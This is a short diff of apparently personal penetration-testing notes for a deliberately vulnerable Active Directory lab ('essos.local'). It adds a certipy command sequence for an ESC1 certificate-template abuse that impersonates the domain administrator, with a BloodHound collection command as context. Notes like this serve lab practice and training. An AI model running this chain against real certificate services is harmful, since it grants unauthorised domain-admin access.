@@ -225,3 +225,14 @@ bloodhound-python --zip -c All -d sevenkingdoms.local -u brandon.stark@north.sev
       kdc = meereen.essos.local
       admin_server = meereen.essos.local
   }
+
+
+
+esc1
+
+certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.3.12
+
+
+certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
+
+certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
